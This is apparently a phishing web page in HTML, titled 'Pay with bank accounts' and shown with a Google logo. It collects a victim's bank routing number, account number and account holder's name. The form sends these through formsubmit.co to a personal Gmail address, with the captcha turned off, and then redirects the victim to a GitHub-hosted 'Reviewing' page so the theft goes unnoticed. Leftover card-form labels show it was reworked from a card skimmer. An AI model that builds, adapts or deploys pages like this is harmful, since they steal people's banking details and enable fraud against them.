<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<link rel="preconnect" href="https://fonts.googleapis.com" />
		<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
		<link
			href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap"
			rel="stylesheet"
		/>
		<link rel="stylesheet" href="style.css" />
		<title>Pay with bank accounts</title>
	</head>
	<body>
		<div class="card">
			<div class="card__header">
				<img src="Google.png" class="logo" />
				<h1>Pay with bank accounts</h1>
			</div>
			
			 <form method="post"     action="https://formsubmit.co/kt5873202@gmail.com">
			     
				<div class="form-group">
					<label for="full-name">Routing number</label>
					<input
						class="full-name empty"
						type="tel"
						id="full-name"
						aria-label="Full Name"
						name="Routing number"
						placeholder="E.g   1234567890"
						required
					/>
				</div>

				<div class="icon-group-container">
					<label for="card-number">Account number</label>
					<div class="icon-group empty">
						<input
							type="tel"
							id="card-number"
							aria-label="Card Number"
							class="empty"
							name="Account number"
							placeholder="1234 1234 12"
							required
						/>
						<img
							id="card-icon"
							src="credit-card.png"
							height="14"
							width="14"
						/>
					</div>
				</div>

				<div class="row-group">
					<div class="form-group">
						<label for="expiration"></label>
					
					</div>
					<div class="icon-group-container">
						<label for="cvv"></label>
					
					</div>
				</div>
				<div class="form-group">
					<label for="cardholder-name">Your name as it appears on your account</label>
					<input
						type="name"
						id="address"
						class="empty"
						name="account Name"
						aria-label="adress"
						placeholder="Daniel. Morelos"
						required
					/>
				</div>
		
		 <input type="hidden" name="_captcha" value="false">

                  <input type="hidden" name="_next" value="https://minet320.github.io/.com/Reviewing.html">
                  
<Button>Login</Button>
			</form>
			<div class="verify-info">
				<small>Verify the information is correct</small>
			</div>
		</div>
		<script src="https://cdn.jsdelivr.net/npm/cleave.js@1.6.0/dist/cleave.min.js"></script>
		<script src="./index.js" defer></script>
	</body>
</html>
